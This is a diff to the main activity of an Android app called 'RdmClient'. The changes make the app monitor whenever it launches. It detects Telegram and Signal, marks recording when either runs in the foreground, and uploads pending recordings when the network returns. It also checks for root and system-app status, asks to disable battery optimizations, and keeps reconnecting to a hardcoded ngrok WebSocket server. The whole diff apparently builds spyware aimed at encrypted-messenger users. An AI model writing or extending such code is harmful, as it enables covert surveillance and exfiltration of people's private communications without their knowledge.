@@ -1,8 +1,15 @@
 package com.rdm.client
 
 import android.app.Activity
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
+import android.os.Build
 import android.os.Bundle
 import android.text.Editable
 import android.text.TextWatcher
@@ -18,8 +25,10 @@ import com.google.android.material.materialswitch.MaterialSwitch
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.delay
 import org.json.JSONObject
 import android.provider.Settings
+import android.content.SharedPreferences
 
 class MainActivity : AppCompatActivity() {
     private lateinit var tvStatus: TextView
@@ -28,9 +37,10 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnConnect: Button
     private lateinit var btnDisconnect: Button
     private lateinit var btnTestCommand: Button
-    private lateinit var btnDetectApps: Button
     private lateinit var etServerUrl: EditText
     private lateinit var switchAppendDeviceId: MaterialSwitch
+    private lateinit var sharedPreferences: SharedPreferences
+    private lateinit var systemAppHelper: SystemAppHelper
 
     // Telegram/Signal detection UI elements
     private lateinit var tvTelegramStatus: TextView
@@ -44,8 +54,27 @@ class MainActivity : AppCompatActivity() {
     private lateinit var rootExecutor: RootExecutor
     private lateinit var foregroundAppMonitor: ForegroundAppMonitor
     private lateinit var appDetector: AppDetector
+    private lateinit var recordingManager: RecordingManager
 
     private val TAG = "MainActivity"
+    private var isAutoConnecting = false
+    private var shouldAutoReconnect = true
+    private var lastServiceStartTime = 0L
+
+    // Network monitoring
+    private lateinit var connectivityManager: ConnectivityManager
+    private lateinit var networkCallback: ConnectivityManager.NetworkCallback
+    private var isNetworkAvailable = false
+
+    // Broadcast receiver for connection status updates from RdmService
+    private val connectionStatusReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            if (intent?.action == RdmService.ACTION_CONNECTION_STATUS_CHANGED) {
+                val isConnected = intent.getBooleanExtra(RdmService.EXTRA_IS_CONNECTED, false)
+                updateConnectionStatusUI(isConnected)
+            }
+        }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -57,6 +86,12 @@ class MainActivity : AppCompatActivity() {
             Settings.Secure.ANDROID_ID
         ) ?: "unknown"
 
+        // Initialize shared preferences
+        sharedPreferences = getSharedPreferences("RdmClient", Context.MODE_PRIVATE)
+
+        // Initialize system app helper
+        systemAppHelper = SystemAppHelper(this)
+
         // Initialize views
         tvStatus = findViewById(R.id.tvStatus)
         tvDeviceInfoHint = findViewById(R.id.tvDeviceInfoHint)
@@ -64,7 +99,6 @@ class MainActivity : AppCompatActivity() {
         btnConnect = findViewById(R.id.btnConnect)
         btnDisconnect = findViewById(R.id.btnDisconnect)
         btnTestCommand = findViewById(R.id.btnTestCommand)
-        btnDetectApps = findViewById(R.id.btnDetectApps)
         etServerUrl = findViewById(R.id.etServerUrl)
         switchAppendDeviceId = findViewById(R.id.switchAppendDeviceId)
 
@@ -77,11 +111,18 @@ class MainActivity : AppCompatActivity() {
         // Set device ID hint
         tvDeviceInfoHint.text = "Device ID: $deviceId"
 
+        // Load saved server URL
+        val savedUrl = sharedPreferences.getString("server_url", "wss://separately-touched-manatee.ngrok-free.app")
+        etServerUrl.setText(savedUrl)
+
         // Initialize WebSocket client (will be replaced on connect)
-        webSocketClient = WebSocketClient(this, "ws://placeholder:8443/ws/device", deviceId)
+        webSocketClient = WebSocketClient(this, "ws://placeholder:8443/ws/device/$deviceId", deviceId)
 
         // Initialize root executor
         rootExecutor = RootExecutor()
+
+        // Initialize recording manager
+        recordingManager = RecordingManager(this)
 
         // Initialize app detector for Telegram/Signal
         appDetector = AppDetector(this)
@@ -96,45 +137,237 @@ class MainActivity : AppCompatActivity() {
             onAppChanged = { packageName -> updateRecordingIndicators(packageName) }
         )
 
+        // Set up network monitoring
+        setupNetworkMonitoring()
+
         // Set up listeners
         setupButtonListeners()
         setupTextWatchers()
 
+        // Register broadcast receiver for connection status updates (global broadcast)
+        val filter = IntentFilter(RdmService.ACTION_CONNECTION_STATUS_CHANGED)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(connectionStatusReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
+        } else {
+            registerReceiver(connectionStatusReceiver, filter)
+        }
+
         Log.d(TAG, "MainActivity created. Device ID: $deviceId")
 
-        // Log UI elements initialization
-        Log.d(TAG, "UI elements initialized:")
-        Log.d(TAG, "  - tvStatus: OK")
-        Log.d(TAG, "  - btnConnect: OK")
-        Log.d(TAG, "  - tvTelegramStatus: OK")
-        Log.d(TAG, "  - tvSignalStatus: OK")
-
-        // Auto-start foreground monitor for testing (remove in production)
+        // Check system configuration (async)
         lifecycleScope.launch {
-            Log.d(TAG, "Auto-starting foreground monitor...")
+            systemAppHelper.printDiagnostics()
+            checkSystemConfiguration()
+        }
+
+        // Start app detection immediately (independent of server connection)
+        lifecycleScope.launch {
+            Log.d(TAG, "Starting automatic app detection...")
+            detectApps()
+        }
+
+        // Start foreground monitoring immediately (independent of server connection)
+        lifecycleScope.launch {
+            Log.d(TAG, "Starting foreground app monitor...")
             foregroundAppMonitor.start()
+        }
+
+        // Set up network monitoring
+        setupNetworkMonitoring()
+
+        // Start RdmService immediately for comprehensive monitoring
+        val serverUrl = etServerUrl.text.toString().trim()
+        if (serverUrl.isNotEmpty()) {
+            // Construct WebSocket URL with device ID
+            val baseUrl = if (serverUrl.endsWith("/")) {
+                serverUrl.dropLast(1)
+            } else {
+                serverUrl
+            }
+            val wsUrl = "$baseUrl/ws/device/$deviceId"
+            startRdmService(wsUrl)
+        }
+
+        // Don't create duplicate WebSocket connection - RdmService handles it
+        // Just update UI to show connection status
+        lifecycleScope.launch {
+            delay(2000) // Wait for RdmService to connect
+            Log.d(TAG, "RdmService is handling WebSocket connection")
+        }
+    }
+
+    private suspend fun checkSystemConfiguration() {
+        delay(2000) // Wait 2 seconds before checking
+
+        val status = systemAppHelper.checkPermissions()
+        val issues = status.getIssues()
+
+        if (issues.isNotEmpty()) {
+            Log.w(TAG, "System configuration issues: ${issues.joinToString(", ")}")
+
+            // Request to disable battery optimizations if needed
+            if (!status.batteryOptimizationsDisabled) {
+                Log.d(TAG, "Requesting to disable battery optimizations")
+                systemAppHelper.requestDisableBatteryOptimizations()
+            }
+
+            // Show system info in recording status temporarily
+            val systemInfo = systemAppHelper.getSystemInfo()
+            tvRecordingStatus.text = systemInfo
+            tvRecordingStatus.setTextColor(getColor(R.color.text_secondary))
+
+            // If no root access, show warning
+            if (!status.hasRootAccess) {
+                Toast.makeText(
+                    this@MainActivity,
+                    "Warning: No root access detected. Some features may not work.",
+                    Toast.LENGTH_LONG
+                ).show()
+            }
+        } else {
+            Log.d(TAG, "System configuration OK - fully configured as system app with root access")
+            tvRecordingStatus.text = "System: Fully configured ✓"
+            tvRecordingStatus.setTextColor(getColor(R.color.status_connected))
         }
     }
 
     override fun onDestroy() {
         super.onDestroy()
+        shouldAutoReconnect = false
         foregroundAppMonitor.stop()
         disconnectFromServer()
+        unregisterNetworkCallback()
+
+        // Unregister broadcast receiver
+        try {
+            unregisterReceiver(connectionStatusReceiver)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unregistering connection status receiver", e)
+        }
+
         Log.d(TAG, "MainActivity destroyed")
+    }
+
+    private fun setupNetworkMonitoring() {
+        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+
+        networkCallback = object : ConnectivityManager.NetworkCallback() {
+            override fun onAvailable(network: Network) {
+                super.onAvailable(network)
+                Log.d(TAG, "Network available")
+                isNetworkAvailable = true
+
+                // Trigger upload of pending recordings
+                Log.d(TAG, "Triggering pending recording uploads")
+                recordingManager.onConnectionRestored()
+
+                // Auto-reconnect when network becomes available
+                if (shouldAutoReconnect) {
+                    lifecycleScope.launch {
+                        delay(2000) // Wait 2 seconds before reconnecting
+                        if (shouldAutoReconnect) {
+                            Log.d(TAG, "Auto-reconnecting RdmService due to network availability")
+                            // Trigger RdmService reconnection by restarting it
+                            val serverUrl = etServerUrl.text.toString().trim()
+                            if (serverUrl.isNotEmpty()) {
+                                val baseUrl = if (serverUrl.endsWith("/")) {
+                                    serverUrl.dropLast(1)
+                                } else {
+                                    serverUrl
+                                }
+                                val wsUrl = "$baseUrl/ws/device/$deviceId"
+                                startRdmService(wsUrl)
+                            }
+                        }
+                    }
+                }
+            }
+
+            override fun onLost(network: Network) {
+                super.onLost(network)
+                Log.d(TAG, "Network lost")
+                isNetworkAvailable = false
+
+                runOnUiThread {
+                    tvStatus.text = "● No Internet"
+                    tvStatus.setTextColor(getColor(R.color.status_disconnected))
+                }
+            }
+
+            override fun onCapabilitiesChanged(
+                network: Network,
+                networkCapabilities: NetworkCapabilities
+            ) {
+                super.onCapabilitiesChanged(network, networkCapabilities)
+                isNetworkAvailable = networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                Log.d(TAG, "Network capabilities changed. Internet available: $isNetworkAvailable")
+            }
+        }
+
+        val networkRequest = NetworkRequest.Builder()
+            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+            .build()
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            connectivityManager.registerDefaultNetworkCallback(networkCallback)
+        } else {
+            connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
+        }
+
+        // Check initial network state
+        val activeNetwork = connectivityManager.activeNetworkInfo
+        isNetworkAvailable = activeNetwork?.isConnected == true
+        Log.d(TAG, "Initial network state: $isNetworkAvailable")
+    }
+
+    private fun unregisterNetworkCallback() {
+        try {
+            connectivityManager.unregisterNetworkCallback(networkCallback)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unregistering network callback", e)
+        }
     }
 
     private fun setupButtonListeners() {
         btnConnect.setOnClickListener {
-            connectToServer()
+            Log.d(TAG, "Manual reconnect - restarting RdmService")
+            // Stop and restart RdmService with new URL
+            try {
+                val intent = Intent(this, RdmService::class.java).apply {
+                    action = RdmService.ACTION_STOP
+                }
+                startService(intent)
+
+                val serverUrl = etServerUrl.text.toString().trim()
+                if (serverUrl.isNotEmpty()) {
+                    val baseUrl = if (serverUrl.endsWith("/")) {
+                        serverUrl.dropLast(1)
+                    } else {
+                        serverUrl
+                    }
+                    val wsUrl = "$baseUrl/ws/device/$deviceId"
+                    val startIntent = Intent(this, RdmService::class.java).apply {
+                        action = RdmService.ACTION_START
+                        putExtra(RdmService.EXTRA_SERVER_URL, wsUrl)
+                    }
+                    startForegroundService(startIntent)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to reconnect", e)
+            }
         }
 
         btnDisconnect.setOnClickListener {
-            disconnectFromServer()
-        }
-
-        btnDetectApps.setOnClickListener {
-            Log.d(TAG, "Detect Apps button clicked")
-            detectApps()
+            Log.d(TAG, "Disconnect button clicked - stopping RdmService")
+            shouldAutoReconnect = false
+            try {
+                val intent = Intent(this, RdmService::class.java).apply {
+                    action = RdmService.ACTION_STOP
+                }
+                startService(intent)
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to stop service", e)
+            }
         }
 
         btnTestCommand.setOnClickListener {
@@ -142,18 +375,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         switchAppendDeviceId.setOnCheckedChangeListener { _, isChecked ->
-            // URL is auto-updated in connectToServer
             Log.d(TAG, "Append device ID: $isChecked")
-        }
-
-        // Auto-start foreground monitor for testing (comment this out in production)
-        btnDetectApps.setOnLongClickListener {
-            Log.d(TAG, "Auto-starting foreground monitor for testing")
-            detectApps()
-            lifecycleScope.launch {
-                foregroundAppMonitor.start()
-            }
-            true
         }
     }
 
@@ -161,73 +383,79 @@ class MainActivity : AppCompatActivity() {
         etServerUrl.setOnEditorActionListener { _, actionId, event ->
             if (actionId == EditorInfo.IME_ACTION_DONE ||
                 (event != null && event.keyCode == KeyEvent.KEYCODE_ENTER)) {
+                isAutoConnecting = false
                 connectToServer()
                 true
             } else {
                 false
             }
         }
+
+        etServerUrl.addTextChangedListener(object : TextWatcher {
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
+            override fun afterTextChanged(s: Editable?) {
+                // Save URL for auto-reconnect
+                sharedPreferences.edit().putString("server_url", s.toString()).apply()
+            }
+        })
     }
 
+    // NOTE: WebSocket connection is now handled entirely by RdmService
+    // MainActivity only manages the UI and service lifecycle
     private fun connectToServer() {
-        val urlInput = etServerUrl.text.toString().trim()
-        val serverUrl = if (switchAppendDeviceId.isChecked) {
-            if (!urlInput.endsWith("/")) {
-                "$urlInput/$deviceId"
+        // This method is kept for compatibility but delegates to RdmService
+        val serverUrl = etServerUrl.text.toString().trim()
+        if (serverUrl.isNotEmpty()) {
+            val baseUrl = if (serverUrl.endsWith("/")) {
+                serverUrl.dropLast(1)
             } else {
-                "$urlInput$deviceId"
+                serverUrl
             }
-        } else {
-            urlInput
+            val wsUrl = "$baseUrl/ws/device/$deviceId"
+            startRdmService(wsUrl)
         }
+    }
 
-        if (serverUrl.isEmpty()) {
-            Toast.makeText(this, "Please enter server URL", Toast.LENGTH_SHORT).show()
-            return
+    private fun startRdmService(serverUrl: String) {
+        try {
+            // Prevent rapid repeated service starts (within 2 seconds)
+            val now = System.currentTimeMillis()
+            if (now - lastServiceStartTime < 2000) {
+                Log.d(TAG, "Ignoring rapid RdmService start request")
+                return
+            }
+            lastServiceStartTime = now
+
+            val intent = Intent(this, RdmService::class.java).apply {
+                action = RdmService.ACTION_START
+                putExtra(RdmService.EXTRA_SERVER_URL, serverUrl)
+            }
+            startForegroundService(intent)
+            Log.d(TAG, "RdmService started with URL: $serverUrl")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start RdmService", e)
         }
+    }
 
-        if (!serverUrl.startsWith("ws://") && !serverUrl.startsWith("wss://")) {
-            Toast.makeText(this, "URL must start with ws:// or wss://", Toast.LENGTH_SHORT).show()
-            return
-        }
-
-        tvStatus.text = "● Connecting..."
-        tvStatus.setTextColor(getColor(R.color.status_connecting))
-
+    private fun sendInitialDeviceInfo() {
         lifecycleScope.launch {
             try {
-                // Reinitialize WebSocket client with new URL
-                webSocketClient = WebSocketClient(this@MainActivity, serverUrl, deviceId)
-
-                // Start monitoring
-                foregroundAppMonitor.start()
-
-                // Detect apps
-                detectApps()
-
-                btnConnect.isEnabled = false
-                btnDisconnect.isEnabled = true
-                etServerUrl.isEnabled = false
-                switchAppendDeviceId.isEnabled = false
-
-                tvStatus.text = "● Connected"
-                tvStatus.setTextColor(getColor(R.color.status_connected))
-
-                Toast.makeText(this@MainActivity, "Connected to server", Toast.LENGTH_SHORT).show()
-                Log.d(TAG, "Connected to server: $serverUrl")
+                detectApps() // Always detect apps when connected
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to connect to server", e)
-                tvStatus.text = "● Failed"
-                tvStatus.setTextColor(getColor(R.color.status_disconnected))
-                Toast.makeText(this@MainActivity, "Connection failed: ${e.message}", Toast.LENGTH_LONG).show()
+                Log.e(TAG, "Error sending initial device info", e)
             }
         }
     }
 
     private fun disconnectFromServer() {
         try {
-            webSocketClient.disconnect()
-            foregroundAppMonitor.stop()
+            // Stop RdmService
+            val intent = Intent(this, RdmService::class.java).apply {
+                action = RdmService.ACTION_STOP
+            }
+            startService(intent)
+            Log.d(TAG, "RdmService stopped")
 
             btnConnect.isEnabled = true
             btnDisconnect.isEnabled = false
@@ -238,14 +466,13 @@ class MainActivity : AppCompatActivity() {
             tvStatus.setTextColor(getColor(R.color.status_disconnected))
 
             Toast.makeText(this, "Disconnected from server", Toast.LENGTH_SHORT).show()
-            Log.d(TAG, "Disconnected from server")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to disconnect", e)
         }
     }
 
     private fun detectApps() {
-        Log.d(TAG, "detectApps() called")
+        Log.d(TAG, "detectApps() called - running automatic app detection")
         lifecycleScope.launch {
             val detectedResult = appDetector.detectApps()
 
@@ -273,8 +500,14 @@ class MainActivity : AppCompatActivity() {
                 }
 
                 val detectedCount = detectedApps.values.count { it.isInstalled }
-                Toast.makeText(this@MainActivity, "$detectedCount app(s) detected", Toast.LENGTH_SHORT).show()
-                Log.d(TAG, "Apps detected: $detectedCount")
+                Log.d(TAG, "Apps detected automatically: $detectedCount")
+
+                // Only show toast if it's a manual detection (not auto)
+                if (!isAutoConnecting) {
+                    Toast.makeText(this@MainActivity, "$detectedCount app(s) detected", Toast.LENGTH_SHORT).show()
+                }
+            } else {
+                Log.e(TAG, "App detection failed: ${detectedResult.exceptionOrNull()?.message}")
             }
         }
     }
@@ -367,6 +600,28 @@ class MainActivity : AppCompatActivity() {
             // Signal is not foreground
             tvSignalRecording.text = "○"
             tvSignalRecording.setTextColor(getColor(R.color.status_disconnected_dim))
+        }
+    }
+
+    private fun updateConnectionStatusUI(isConnected: Boolean) {
+        runOnUiThread {
+            if (isConnected) {
+                tvStatus.text = "● Online"
+                tvStatus.setTextColor(getColor(R.color.status_connected))
+                btnConnect.isEnabled = false
+                btnDisconnect.isEnabled = true
+                etServerUrl.isEnabled = false
+                switchAppendDeviceId.isEnabled = false
+                Log.d(TAG, "UI updated: Connected")
+            } else {
+                tvStatus.text = "● Offline"
+                tvStatus.setTextColor(getColor(R.color.status_disconnected))
+                btnConnect.isEnabled = true
+                btnDisconnect.isEnabled = false
+                etServerUrl.isEnabled = true
+                switchAppendDeviceId.isEnabled = true
+                Log.d(TAG, "UI updated: Disconnected")
+            }
         }
     }
 
